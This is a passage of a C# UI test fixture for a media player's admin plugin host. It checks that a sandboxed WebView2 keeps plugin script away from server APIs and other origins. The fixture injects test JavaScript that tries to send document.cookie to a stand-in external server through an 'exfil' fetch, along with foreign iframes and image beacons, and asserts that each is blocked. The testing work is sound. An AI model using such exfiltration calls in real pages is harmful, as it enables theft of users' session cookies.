using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Text;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Automation;
using Microsoft.UI.Xaml.Automation.Peers;
using Microsoft.UI.Xaml.Automation.Provider;
using Microsoft.UI.Xaml.Controls;
using Microsoft.UI.Xaml.Media;
using Microsoft.UI.Xaml.Media.Imaging;
using SiloPlayer;
using SiloPlayer.Core.Api;
using SiloPlayer.Core.Models.Auth;
using SiloPlayer.Core.Services;
using SiloPlayer.Core.Services.Admin;
using SiloPlayer.Helpers;
using SiloPlayer.Views;
using SiloPlayer.Views.Admin;
using Windows.Graphics.Imaging;
using Windows.Storage;

/// <summary>
/// Admin Plugin Apps through the real shell, Frame, sidebar, search and plugin host, against a
/// synthetic loopback "server" that issues the official launch cookie and serves synthetic plugin
/// content. The server records every request line and header so the fixture can prove what reached
/// the plugin content. No user account, app data, installed player or production endpoint participates.
/// </summary>
internal static class AdminPluginAppsNativeFixture
{
    private const string LaunchToken = "synthetic-launch-token";
    private const string AccessToken = "synthetic-access";

    internal static async Task RunAsync(StackPanel parent)
    {
        await using var server = new PluginServer();
        await using var external = new PluginServer();
        using var inventory = new Inventory();
        using var http = new HttpClient(inventory);
        var client = new SiloApiClient(http);
        client.SetBaseUrl(server.Origin);
        using var auth = new AuthService(client, new AuthApi(client));
        auth.SetTokens(AccessToken, "synthetic-refresh", 86400);
        auth.SetCurrentUser(new UserInfo { Id = "1", Username = "synthetic-admin", Role = "admin" });
        auth.SelectProfile("p1", null, new Profile { Id = "p1", Name = "Primary", IsPrimary = true });
        using var authority = new AdminMonitorAuthority(client, auth);
        var navigation = new NavigationService();
        await using var services = new ServiceCollection().AddSingleton(client).AddSingleton(auth).AddSingleton(authority)
            .AddSingleton(new AdminMonitorApi(client)).AddSingleton(new AdminPluginAppsApi(client))
            .AddSingleton(navigation).AddSingleton(new SettingsService(Program.ResultDirectory)).BuildServiceProvider();
        var slot = typeof(App).GetField("_services", BindingFlags.Static | BindingFlags.NonPublic)!;
        var original = slot.GetValue(null);
        var previousData = Environment.GetEnvironmentVariable("WEBVIEW2_USER_DATA_FOLDER");
        Environment.SetEnvironmentVariable("WEBVIEW2_USER_DATA_FOLDER", Path.Combine(Program.ResultDirectory, "admin-plugin-webview"));
        slot.SetValue(null, services);
        var outer = new Frame { Width = 1280, Height = 800 };
        navigation.Frame = outer;
        parent.Children.Add(outer);
        var pages = new List<FrameworkElement>();
        try
        {
            // ---- Navigation entries built from the admin installations inventory.
            Check(AdminShellPage.Open(new AdminRouteRequest(AdminRoute.Activity)), "registered production Admin entry opens");
            var shell = (AdminShellPage)outer.Content;
            pages.Add(shell);
            await Until(() => Rows(shell).Length == 2);
            var apps = Rows(shell).Select(button => (AdminPluginApp)button.Tag).ToArray();
            Check(apps.Select(app => (app.InstallationId, app.RoutePath, app.Label)).SequenceEqual(new[] { (7, "/custom/*", "Synthetic Custom Admin"), (8, "/tools", "second-admin-only") }),
                "Plugin Apps lists enabled installations' navigable admin routes in inventory order, with the plugin id when no label is given");
            Check(!Descendants(shell).OfType<TextBlock>().Any(text => text.Text is "Disabled Admin" or "User App" or "Hidden Admin"), "disabled, user-only and non-navigable routes stay out of Admin");
            Check(Descendants(shell).OfType<TextBlock>().Any(text => text.Text == "PLUGIN APPS" || text.Text == "Plugin Apps"), "the section is headed Plugin Apps");
            Check(inventory.UserSettingsReads == 0, "admin-only installations come from the admin inventory, not the user settings endpoint");
            await Capture(outer, "admin-plugin-apps-desktop.png");

            outer.Width = 800;
            await Task.Delay(100);
            InvokePrivate(shell, "OpenDrawer");
            await Until(() => Rows(shell).Length == 2);
            Check(Rows(shell).All(button => button.MinHeight >= 44), "the narrow drawer offers touch-sized Plugin Apps rows");
            await Capture(outer, "admin-plugin-apps-drawer.png");
            InvokePrivate(shell, "CloseDrawer");
            outer.Width = 1280;
            await Until(() => Rows(shell).Length == 2);

            var search = (Task)InvokePrivate(shell, "ShowSearchAsync")!;
            await Until(() => Field<Grid?>(shell, "_searchOverlay") != null);
            var overlay = Field<Grid>(shell, "_searchOverlay");
            Descendants(overlay).OfType<TextBox>().Single().Text = "synthetic-admin-only";
            await Until(() => Rows(overlay).Length == 1);
            Check(Descendants(overlay).OfType<TextBlock>().Any(text => text.Text == "Plugin Apps"), "command search groups the plugin app under Plugin Apps");
            Check(Descendants(overlay).OfType<TextBlock>().Any(text => text.Text == "synthetic-admin-only plugin app."), "command search shows the official plugin app description");
            Field<Action>(shell, "_closeSearch")();
            await search;

            // ---- Opening a plugin page: official launch, then the page with only the launch cookie.
            Click(Rows(shell).Single(button => ((AdminPluginApp)button.Tag).InstallationId == 7));
            await Until(() => outer.Content is PluginRoutePage);
            var page = (PluginRoutePage)outer.Content;
            pages.Add(page);
            var web = (WebView2)page.FindName("PluginWebView");
            await UntilState(page, "Ready");
            await UntilScript(web, "document.body.dataset.ready === 'yes'");
            var core = web.CoreWebView2;
            Check(core.Profile.IsInPrivateModeEnabled && core.Profile.ProfileName == "SiloAdminPluginApps", "plugin content runs in its own InPrivate profile");
            Check(!core.Settings.AreHostObjectsAllowed && !core.Settings.IsWebMessageEnabled && !core.Settings.AreDevToolsEnabled &&
                !core.Settings.AreDefaultContextMenusEnabled && !core.Settings.AreBrowserAcceleratorKeysEnabled,
                "no host objects, web messages, developer tools, context menu or browser accelerator keys");
            var launches = server.Snapshot().Where(request => request.Path == "/api/v2/auth/plugin-launch").ToArray();
            Check(launches.Length == 1 && launches[0].Method == "POST" && launches[0].Header("Authorization") == "Bearer " + AccessToken,
                "the app launched the plugin once with the admin session (POST /api/v2/auth/plugin-launch)");
            Check(server.Snapshot().Any(request => request.Target == "/api/v2/plugin-content/plugins/7/custom?theme=midnight-cinema"),
                "the page opens at pluginRouteHref with the WebUI theme parameter");
            Check(server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugins/7/custom/probe") &&
                server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugin-assets/7/pixel.svg"),
                "the plugin's own script fetch and installation asset load");
            Check(await web.ExecuteScriptAsync("document.cookie.indexOf('" + LaunchToken + "') < 0 && localStorage.length === 0 && sessionStorage.length === 0") == "true",
                "the launch cookie is HttpOnly and the page starts with empty storage");
            var cookies = await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/plugin-content/plugins/7/");
            Check(cookies.Count == 1 && cookies[0].Name == "silo_plugin_access" && cookies[0].IsHttpOnly && cookies[0].Path == "/api/v2/plugin-content",
                "the web view holds exactly the official cookie on the plugin-content parent path");
            Check((await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/admin/users")).Count == 0, "no cookie applies to server APIs");

            // ---- Navigation, frames, popups, fetches and messages outside the allowed space.
            var messagesReachedNative = 0;
            core.WebMessageReceived += (_, _) => messagesReachedNative++;
            var popups = 0;
            var popupHandled = true;
            core.NewWindowRequested += (_, e) => { popups++; popupHandled &= e.Handled; };
            await web.ExecuteScriptAsync("window.location.href='" + external.Origin + "/outside'");
            await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/plugin-content/plugins/8/', 50)");
            await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/admin/users', 100)");
            await Task.Delay(700);
            Check(external.Snapshot().Length == 0 && !server.Snapshot().Any(request => request.Path.StartsWith("/api/v2/plugin-content/plugins/8", StringComparison.Ordinal) || request.Path == "/api/v2/admin/users"),
                "navigation to another origin, another installation or a server API is cancelled before any request");
            Check(await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true" && State(page) == "Ready", "a refused link leaves the plugin page as it was");
            await web.ExecuteScriptAsync("window.open('" + external.Origin + "/popup', '_blank'); window.open('/api/v2/plugin-content/plugins/7/custom/', 'child')");
            await Until(() => popups == 2);
            await Task.Delay(200);
            Check(popupHandled && !external.Snapshot().Any(request => request.Path == "/popup"), "window.open is suppressed, even for the plugin's own pages");
            await web.ExecuteScriptAsync("""
                const frame = document.createElement('iframe'); frame.src = '__EXTERNAL__/framed'; document.body.appendChild(frame);
                fetch('/api/v2/admin/users').then(r => document.body.dataset.api = String(r.status)).catch(() => document.body.dataset.api = 'blocked');
                fetch('__EXTERNAL__/exfil?t=' + document.cookie).then(r => document.body.dataset.foreign = String(r.status)).catch(() => document.body.dataset.foreign = 'blocked');
                fetch('/api/v2/plugin-content/plugins/8/data').then(r => document.body.dataset.other = String(r.status)).catch(() => document.body.dataset.other = 'blocked');
                const img = new Image(); img.src = '__EXTERNAL__/beacon.svg'; document.body.appendChild(img);
                """.Replace("__EXTERNAL__", external.Origin));
            await UntilScript(web, "document.body.dataset.api !== undefined && document.body.dataset.foreign !== undefined && document.body.dataset.other !== undefined");
            await Task.Delay(300);
            Check(external.Snapshot().Length == 0, "frames, fetches and images to another origin never leave the web view");
            Check(!server.Snapshot().Any(request => request.Path is "/api/v2/admin/users" or "/api/v2/plugin-content/plugins/8/data"),
                "plugin script cannot call server APIs or another installation's routes");
            // There is no host message contract: an unknown message type and a message from a
            // foreign frame are both dropped without reaching native code or changing state.
            await web.ExecuteScriptAsync("""
                try { window.chrome.webview.postMessage({ type: 'synthetic-unknown', href: '/admin/users' }); document.body.dataset.post = 'sent'; } catch (e) { document.body.dataset.post = 'unavailable'; }
                window.postMessage({ type: 'navigate', href: 'https://foreign.invalid/' }, '*');
                """);
            await UntilScript(web, "document.body.dataset.post !== undefined");
            await Task.Delay(200);
            Check(messagesReachedNative == 0 && State(page) == "Ready" && ReferenceEquals(outer.Content, page),
                "messages of unknown type or from a wrong origin are ignored (no message channel exists)");
            // A page that is already shown survives its own later navigations: a fragment navigation completes without an
            // HTTP status, and the plugin's own error response stays visible as it does in the browser tab.
            await web.ExecuteScriptAsync("window.location.hash = 'section'");
            await UntilScript(web, "window.location.hash === '#section'");
            await Task.Delay(300);
            Check(State(page) == "Ready" && web.Visibility == Visibility.Visible && await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true",
                "a fragment navigation keeps the loaded plugin page");
            await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/missing'");
            await UntilScript(web, "Boolean(document.body) && document.body.innerText.indexOf('Outside fixture contract') >= 0");
            await Task.Delay(300);
            Check(State(page) == "Ready" && web.Visibility == Visibility.Visible &&
                await web.ExecuteScriptAsync("document.body.innerText.indexOf('Outside fixture contract') >= 0") == "true",
                "the plugin's own error response to a later navigation stays visible");
            await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/'");
            await UntilScript(web, "Boolean(document.body) && document.body.dataset.ready === 'yes'");
            Check(State(page) == "Ready", "the plugin page continues after its own error response");
            await web.ExecuteScriptAsync("document.getElementById('submit').click()");
            await UntilScript(web, "document.body && document.body.dataset.submitted === 'yes'");
            Check(server.Writes == 1, "the plugin's own form posts once inside its page space");
            await CheckCredentialsAsync(server, external);
            Program.Log("PASS: plugin opened with the official launch cookie only; outside navigation, popups, frames, foreign/API fetches and messages blocked.");

            // ---- Removal while open, then every failure state with a reachable Reload.
            inventory.Without7 = true;
            await (Task)InvokePrivate(page, "CheckAdminAvailabilityAsync")!;
            await UntilState(page, "Unavailable");
            Check(web.Visibility == Visibility.Collapsed && (await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/plugin-content/")).Count == 0,
                "a route removed from the inventory tears the content down and clears its session");
            CheckStateText(page, "This plugin app is not available");
            await ClickReload(page);
            await UntilState(page, "Unavailable");
            inventory.Without7 = false;
            inventory.Disabled7 = true;
            await ClickReload(page);
            await UntilState(page, "Unavailable");
            Check(web.Visibility == Visibility.Collapsed, "a route whose installation was disabled is not reachable");
            inventory.Disabled7 = false;
            await ClickReload(page);
            await UntilState(page, "Ready");
            Program.Log("PASS: disable or removal while open shows the native not-available state; Reload recovers once the route returns.");

            // From Ready the next load is started directly (the sidebar entry would start it in the
            // app); afterwards each failure state's own Reload starts the next one.
            server.Mode = "401";
            await (Task)InvokePrivate(page, "LoadAdminContentAsync")!;
            foreach (var (mode, state, text) in new[]
            {
                ("401", "SignInRequired", "Unable to open the plugin. Please try again."),
                ("403", "Forbidden", "Unable to open the plugin. Please try again."),
                ("404", "Unavailable", "This plugin app is not available"),
                ("500", "ServerError", "Unable to open the plugin. Please try again."),
                ("drop", "LoadFailed", "Unable to open the plugin. Please try again."),
                ("launch403", "Forbidden", "Unable to open the plugin. Please try again."),
                ("launch503", "ServerError", "Unable to open the plugin. Please try again."),
            })
            {
                server.Mode = mode;
                if (mode != "401") await ClickReload(page);
                await UntilState(page, state);
                CheckStateText(page, text);
                if (mode == "401") await Capture(outer, "admin-plugin-apps-state.png");
                Check(web.Visibility == Visibility.Collapsed, mode + ": no plugin or server error text is shown, only the native state");
                server.Mode = "";
            }
            typeof(PluginRoutePage).GetField("s_adminLoadDeadline", BindingFlags.Static | BindingFlags.NonPublic)!.SetValue(null, TimeSpan.FromSeconds(2));
            Field<DispatcherTimer?>(page, "_adminDeadline")?.Stop();
            typeof(PluginRoutePage).GetField("_adminDeadline", BindingFlags.Instance | BindingFlags.NonPublic)!.SetValue(page, null);
            server.Mode = "hang";
            await ClickReload(page);
            await UntilState(page, "TimedOut");
            CheckStateText(page, "Unable to open the plugin. Please try again.");
            server.Mode = "";
            server.ReleaseHangs();
            typeof(PluginRoutePage).GetField("s_adminLoadDeadline", BindingFlags.Static | BindingFlags.NonPublic)!.SetValue(null, TimeSpan.FromSeconds(30));
            Field<DispatcherTimer?>(page, "_adminDeadline")?.Stop();
            typeof(PluginRoutePage).GetField("_adminDeadline", BindingFlags.Instance | BindingFlags.NonPublic)!.SetValue(page, null);
            await ClickReload(page);
            await UntilState(page, "Ready");
            await UntilScript(web, "document.body.dataset.ready === 'yes'");
            await CheckCredentialsAsync(server, external);
            Program.Log("PASS: 401, 403, 404, 5xx, dropped connection, refused launch and a hanging page each show a native state with Reload, and Reload recovers.");

            // ---- The web view's browser process exits: nothing of it can be used again, and Reload builds a new hardened web view.
            using (var browser = System.Diagnostics.Process.GetProcessById((int)core.BrowserProcessId))
            {
                browser.Kill();
                browser.WaitForExit(10000);
            }
            await Until(() => State(page) == "LoadFailed" && Field<object?>(page, "_adminCore") == null);
            CheckStateText(page, "Unable to open the plugin. Please try again.");
            await ClickReload(page);
            await UntilState(page, "Ready");
            web = Field<WebView2>(page, "PluginWebView");
            core = web.CoreWebView2;
            await UntilScript(web, "document.body.dataset.ready === 'yes'");
            Check(core.Profile.IsInPrivateModeEnabled && core.Profile.ProfileName == "SiloAdminPluginApps" && !core.Settings.AreHostObjectsAllowed &&
                !core.Settings.IsWebMessageEnabled && !core.Settings.AreDevToolsEnabled, "the new web view is the same InPrivate, hardened host");
            cookies = await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/plugin-content/plugins/7/");
            Check(cookies.Count == 1 && cookies[0].Name == "silo_plugin_access" && cookies[0].IsHttpOnly && cookies[0].Path == "/api/v2/plugin-content",
                "the new web view holds exactly the newly issued launch cookie");
            await CheckCredentialsAsync(server, external);
            Program.Log("PASS: after the web view's browser process exits, Reload opens the plugin page in a new web view.");

            // ---- Authority change while open tears down and never reopens under the new authority.
            var before = server.Snapshot().Length;
            auth.SetCurrentUser(new UserInfo { Id = "1", Username = "synthetic-admin", Role = "user" });
            await UntilState(page, "AuthorityChanged");
            Check(Find<Button>(page, "AdminPluginReload").Visibility == Visibility.Collapsed && Find<Button>(page, "AdminPluginReturn").Visibility == Visibility.Visible,
                "an authority change offers a way back to Admin, never a reload under the new authority");
            Check(Field<bool>(page, "_webViewClosed"), "the plugin web view is closed on authority change");
            await Task.Delay(300);
            Check(server.Snapshot().Length == before, "nothing from the retired page reaches the server afterwards");
            Program.Log("PASS: role loss while open closes the plugin content and its session.");

            // ---- Shell: retired rows, detached clicks, stale inventory, failed inventory with retry.
            auth.SetCurrentUser(new UserInfo { Id = "1", Username = "synthetic-admin", Role = "admin" });
            Check(AdminShellPage.Open(new AdminRouteRequest(AdminRoute.Activity)), "Admin can be reopened after a fresh grant");
            var nextShell = (AdminShellPage)outer.Content;
            pages.Add(nextShell);
            await Until(() => Rows(nextShell).Length == 2);
            var detached = Rows(nextShell)[0];
            var gate = new TaskCompletionSource<HttpResponseMessage>(TaskCreationOptions.RunContinuationsAsynchronously);
            inventory.HoldNext = gate;
            var reads = inventory.Reads;
            auth.SelectProfile("p2", null, new Profile { Id = "p2", Name = "Second Primary", IsPrimary = true });
            await Until(() => inventory.Reads > reads && Rows(nextShell).Length == 0);
            Click(detached);
            await Task.Delay(75);
            Check(ReferenceEquals(outer.Content, nextShell), "a detached row cannot navigate after authority retirement");
            inventory.Label = "Replacement Admin App";
            auth.SelectProfile("p3", null, new Profile { Id = "p3", Name = "Third Primary", IsPrimary = true });
            await Until(() => Rows(nextShell).Any(button => ((AdminPluginApp)button.Tag).Label == "Replacement Admin App"));
            gate.SetResult(Inventory.Json(inventory.Body("Retired Admin App")));
            await Task.Delay(150);
            Check(!Rows(nextShell).Any(button => ((AdminPluginApp)button.Tag).Label == "Retired Admin App"), "a delayed retired inventory cannot replace the current group");

            inventory.Fail = true;
            authority.Retire();
            await Until(() => Descendants(nextShell).OfType<Button>().Any(button => Equals(button.Tag, "AdminPluginAppsRetry")));
            inventory.Fail = false;
            Click(Descendants(nextShell).OfType<Button>().Single(button => Equals(button.Tag, "AdminPluginAppsRetry")));
            await Until(() => Rows(nextShell).Length == 2);
            Check(inventory.UserSettingsReads == 0, "retry still uses the admin installation inventory");

            // ---- Leaving the page tears its content down.
            Click(Rows(nextShell).Single(button => ((AdminPluginApp)button.Tag).InstallationId == 8));
            await Until(() => outer.Content is PluginRoutePage);
            var second = (PluginRoutePage)outer.Content;
            pages.Add(second);
            await UntilState(second, "Ready");
            // This plugin sets its fragment in an inline script while its page is still opening: the navigation that opens
            // the page still decides, whichever of the two completes first.
            var secondWeb = (WebView2)second.FindName("PluginWebView");
            await UntilScript(secondWeb, "window.location.hash === '#opening' && document.body.dataset.ready === 'yes'");
            Check(State(second) == "Ready" && secondWeb.Visibility == Visibility.Visible, "a fragment the plugin sets while its page is opening does not keep the page from being shown");
            // The same page setting its fragment twice while it is opening (a router that sets its route and then replaces it).
            server.Mode = "twice";
            await (Task)InvokePrivate(second, "LoadAdminContentAsync")!;
            await UntilState(second, "Ready");
            await UntilScript(secondWeb, "window.location.hash === '#second' && document.body.dataset.ready === 'yes'");
            Check(State(second) == "Ready" && secondWeb.Visibility == Visibility.Visible, "two fragments the plugin sets while its page is opening do not keep the page from being shown");
            server.Mode = "";
            outer.GoBack();
            await Until(() => outer.Content is AdminShellPage && Field<bool>(second, "_webViewClosed"));
            Check(Field<object?>(second, "_adminLease") == null, "leaving the plugin page closes its web view and releases its Admin lease");
            Program.Log("PASS: shell clears retired rows, rejects detached clicks, discards delayed reads, retries a failed inventory, and leaving a plugin page tears it down.");
        }
        finally
        {
            server.ReleaseHangs();
            // Close/unload pages before restoring the global provider or WebView environment.
            outer.Navigate(typeof(Page));
            outer.BackStack.Clear(); outer.ForwardStack.Clear();
            parent.Children.Remove(outer);
            await Until(() => pages.All(page => !page.IsLoaded) && !outer.IsLoaded);
            navigation.Frame = null;
            slot.SetValue(null, original);
            Environment.SetEnvironmentVariable("WEBVIEW2_USER_DATA_FOLDER", previousData);
        }
    }

    /// <summary>
    /// The launch is the only request with the admin's bearer, profile or device headers. Every
    /// other request the server saw carries no account credential in a header or URL, and a Cookie
    /// header only on the plugin-content mount, holding only the launch cookie.
    /// </summary>
    private static Task CheckCredentialsAsync(PluginServer server, PluginServer external)
    {
        foreach (var request in server.Snapshot())
        {
            var launch = request.Path == "/api/v2/auth/plugin-launch";
            Check(launch || (request.Header("Authorization") == null && !request.Headers.Keys.Any(name =>
                name.StartsWith("X-Profile-", StringComparison.OrdinalIgnoreCase) || name.StartsWith("X-Silo-Device", StringComparison.OrdinalIgnoreCase))),
                "no account headers on " + request.Method + " " + request.Path, quiet: true);
            Check(launch || (!request.Target.Contains(AccessToken, StringComparison.Ordinal) && !request.Target.Contains("token=", StringComparison.OrdinalIgnoreCase) &&
                !request.Headers.Values.Any(value => value.Contains(AccessToken, StringComparison.Ordinal))), "no access token in " + request.Path, quiet: true);
            if (request.Header("Cookie") is { } cookie)
                Check(request.Path.StartsWith("/api/v2/plugin-content/", StringComparison.Ordinal) && cookie == "silo_plugin_access=" + LaunchToken,
                    "only the launch cookie, only on plugin content: " + request.Path, quiet: true);
        }
        Check(server.Snapshot().Count(request => request.Header("Cookie") != null) > 0, "plugin content requests carried the launch cookie");
        Check(external.Snapshot().Length == 0, "no request of any kind reached another origin");
        Program.Log("PASS: credential check over " + server.Snapshot().Length + " recorded requests: the admin token appears only on the launch request.");
        return Task.CompletedTask;
    }

    private static string State(PluginRoutePage page) =>
        typeof(PluginRoutePage).GetProperty("AdminState", BindingFlags.Instance | BindingFlags.NonPublic)!.GetValue(page)!.ToString()!;
    private static async Task UntilState(PluginRoutePage page, string state)
    {
        var end = DateTime.UtcNow.AddSeconds(20);
        while (State(page) != state && DateTime.UtcNow < end) await Task.Delay(30);
        if (State(page) != state) throw new TimeoutException("Admin plugin page stayed " + State(page) + " instead of " + state + ".");
        Program.Log("PASS: plugin page state " + state);
    }
    private static void CheckStateText(PluginRoutePage page, string title)
    {
        Check(Find<TextBlock>(page, "AdminPluginStateTitle").Text == title && Find<TextBlock>(page, "AdminPluginStateDetail").Text.Length > 0,
            "state shows \"" + title + "\" with a native explanation");
        Check(Find<Button>(page, "AdminPluginReload").Visibility == Visibility.Visible, "Reload is reachable");
    }
    private static async Task ClickReload(PluginRoutePage page)
    {
        var reload = Find<Button>(page, "AdminPluginReload");
        var host = Descendants(page).OfType<Grid>().Single(grid => Equals(grid.Tag, "AdminPluginState"));
        await Until(() => host.Visibility == Visibility.Visible && reload.Visibility == Visibility.Visible && reload.IsLoaded && reload.ActualWidth > 0);
        Click(reload);
        await Task.Delay(50);
    }
    private static T Find<T>(DependencyObject root, string automationId) where T : FrameworkElement =>
        Descendants(root).OfType<T>().Single(element => AutomationProperties.GetAutomationId(element) == automationId);
    private static Button[] Rows(DependencyObject root) => Descendants(root).OfType<Button>().Where(button => button.Tag is AdminPluginApp).ToArray();
    private static IEnumerable<DependencyObject> Descendants(DependencyObject root)
    {
        yield return root;
        for (var i = 0; i < VisualTreeHelper.GetChildrenCount(root); i++)
            foreach (var item in Descendants(VisualTreeHelper.GetChild(root, i))) yield return item;
    }
    private static T Field<T>(object target, string name) => (T)target.GetType().GetField(name, BindingFlags.Instance | BindingFlags.NonPublic)!.GetValue(target)!;
    private static object? InvokePrivate(object target, string name) => target.GetType().GetMethod(name, BindingFlags.Instance | BindingFlags.NonPublic)!.Invoke(target, null);
    private static void Click(Button button) => ((IInvokeProvider)new ButtonAutomationPeer(button).GetPattern(PatternInterface.Invoke)).Invoke();
    private static void Check(bool condition, string message, bool quiet = false)
    {
        if (!condition) throw new InvalidOperationException(message);
        if (!quiet) Program.Log("PASS: " + message);
    }
    private static async Task Until(Func<bool> ready)
    {
        var end = DateTime.UtcNow.AddSeconds(15);
        while (!ready() && DateTime.UtcNow < end) await Task.Delay(30);
        if (!ready()) throw new TimeoutException("Admin Plugin Apps fixture did not reach its expected state.");
    }
    private static async Task UntilScript(WebView2 web, string expression)
    {
        var end = DateTime.UtcNow.AddSeconds(15);
        while (DateTime.UtcNow < end)
        {
            if (web.CoreWebView2 != null && await web.ExecuteScriptAsync(expression) == "true") return;
            await Task.Delay(40);
        }
        throw new TimeoutException("Admin plugin script state: " + expression);
    }
    private static async Task Capture(FrameworkElement element, string name)
    {
        element.UpdateLayout(); await Task.Delay(150);
        var bitmap = new RenderTargetBitmap(); await bitmap.RenderAsync(element);
        Check(bitmap.PixelWidth > 0 && bitmap.PixelHeight > 0, name + " rendered");
        var folder = await StorageFolder.GetFolderFromPathAsync(Path.GetFullPath(Program.ResultDirectory));
        var file = await folder.CreateFileAsync(name, CreationCollisionOption.ReplaceExisting);
        using var stream = await file.OpenAsync(FileAccessMode.ReadWrite);
        var encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);
        encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)bitmap.PixelWidth, (uint)bitmap.PixelHeight, 96, 96, (await bitmap.GetPixelsAsync()).ToArray());
        await encoder.FlushAsync();
    }

    /// <summary>The app's own API transport: the admin installations inventory.</summary>
    private sealed class Inventory : HttpMessageHandler
    {
        internal int Reads, UserSettingsReads;
        internal bool Fail, Without7, Disabled7;
        internal string Label = "Synthetic‮ Custom Admin";
        internal TaskCompletionSource<HttpResponseMessage>? HoldNext;
        internal static HttpResponseMessage Json(string body) => new(HttpStatusCode.OK) { Content = new StringContent(body, Encoding.UTF8, "application/json") };
        internal string Body(string label)
        {
            var items = new List<object>();
            if (!Without7)
                items.Add(new { id = "7", plugin_id = "synthetic-admin-only", enabled = !Disabled7, routes = new object[] {
                    new { path = "/custom/*", navigable = true, navigation_kind = "admin", navigation_label = label },
                    new { path = "/user", navigable = true, navigation_kind = "user", navigation_label = "User App" },
                    new { path = "/hidden", navigable = false, navigation_kind = "admin", navigation_label = "Hidden Admin" } } });
            items.Add(new { id = "8", plugin_id = "second-admin-only", enabled = true, routes = new[] { new { path = "/tools", navigable = true, navigation_kind = "admin", navigation_label = "" } } });
            items.Add(new { id = "9", plugin_id = "disabled", enabled = false, routes = new[] { new { path = "/", navigable = true, navigation_kind = "admin", navigation_label = "Disabled Admin" } } });
            return System.Text.Json.JsonSerializer.Serialize(new { items, page = new { has_more = false } });
        }
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
        {
            if (request.RequestUri!.AbsolutePath == "/api/v2/settings/plugins") Interlocked.Increment(ref UserSettingsReads);
            if (request.RequestUri.AbsolutePath == "/api/v2/admin/plugins/installations")
            {
                Interlocked.Increment(ref Reads);
                var hold = Interlocked.Exchange(ref HoldNext, null);
                if (hold != null) return hold.Task; // Deliberately ignores cancellation to test stale publication.
                return Task.FromResult(Fail ? new HttpResponseMessage(HttpStatusCode.Forbidden) { Content = new StringContent("{}") } : Json(Body(Label)));
            }
            return Task.FromResult(Json("{}"));
        }
    }

    private sealed record Request(string Method, string Target, string Path, IReadOnlyDictionary<string, string> Headers)
    {
        internal string? Header(string name) => Headers.TryGetValue(name, out var value) ? value : null;
    }

    /// <summary>A synthetic Silo server origin: the launch endpoint plus one installation's plugin content.</summary>
    private sealed class PluginServer : IAsyncDisposable
    {
        private readonly TcpListener _listener = new(IPAddress.Loopback, 0);
        private readonly CancellationTokenSource _stop = new();
        private CancellationTokenSource _hangs = new();
        private readonly Task _loop;
        private readonly ConcurrentBag<Task> _connections = [];
        private readonly ConcurrentQueue<Request> _requests = new();
        internal int Writes;
        internal volatile string Mode = "";
        internal string Origin { get; }
        internal PluginServer()
        {
            _listener.Start(); Origin = "http://127.0.0.1:" + ((IPEndPoint)_listener.LocalEndpoint).Port;
            _loop = Loop();
        }
        internal Request[] Snapshot() => _requests.ToArray();
        internal void ReleaseHangs() { var old = Interlocked.Exchange(ref _hangs, new CancellationTokenSource()); old.Cancel(); }
        private async Task Loop()
        {
            try { while (!_stop.IsCancellationRequested) _connections.Add(Serve(await _listener.AcceptTcpClientAsync(_stop.Token))); }
            catch (OperationCanceledException) { } catch (ObjectDisposedException) { }
        }
        private async Task Serve(TcpClient connection)
        {
            using (connection)
            {
                try
                {
                    using var stream = connection.GetStream();
                    using var reader = new StreamReader(stream, Encoding.UTF8, false, 1024, true);
                    var start = (await reader.ReadLineAsync(_stop.Token))?.Split(' ');
                    if (start is not { Length: >= 2 }) return;
                    var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                    while (await reader.ReadLineAsync(_stop.Token) is { Length: > 0 } line)
                    { var colon = line.IndexOf(':'); if (colon > 0) headers[line[..colon]] = line[(colon + 1)..].Trim(); }
                    if (headers.TryGetValue("Content-Length", out var size) && int.TryParse(size, out var length) && length > 0)
                        await reader.ReadBlockAsync(new char[length].AsMemory(), _stop.Token);
                    var method = start[0];
                    var path = new Uri(Origin + start[1]).AbsolutePath;
                    _requests.Enqueue(new(method, start[1], path, headers));
                    var mode = Mode;
                    var status = 200;
                    var type = "text/html; charset=utf-8";
                    var extra = "";
                    var text = "";
                    var launchCookie = headers.GetValueOrDefault("Cookie") == "silo_plugin_access=" + LaunchToken;
                    if (path == "/api/v2/auth/plugin-launch" && method == "POST")
                    {
                        type = "application/json";
                        if (mode is "launch403" or "launch503") { status = mode == "launch403" ? 403 : 503; type = "application/problem+json"; text = """{"title":"Synthetic refusal","status":403}"""; }
                        else if (headers.GetValueOrDefault("Authorization") != "Bearer " + AccessToken || headers.GetValueOrDefault("X-Profile-Id") is not ("p1" or "p2" or "p3"))
                        { status = 401; type = "application/problem+json"; text = """{"title":"Synthetic unauthorized","status":401}"""; }
                        else
                        {
                            text = """{"expires_in":300}""";
                            extra = "Set-Cookie: silo_plugin_access=" + LaunchToken + "; Path=/api/v2/plugin-content; Max-Age=300; HttpOnly; SameSite=Lax\r\n";
                        }
                    }
                    else if (path.StartsWith("/api/v2/plugin-content/", StringComparison.Ordinal) && mode == "drop" && path.EndsWith("/custom", StringComparison.Ordinal))
                        return;
                    else if (path.StartsWith("/api/v2/plugin-content/", StringComparison.Ordinal) && mode == "hang" && path.EndsWith("/custom", StringComparison.Ordinal))
                    {
                        using var linked = CancellationTokenSource.CreateLinkedTokenSource(_stop.Token, _hangs.Token);
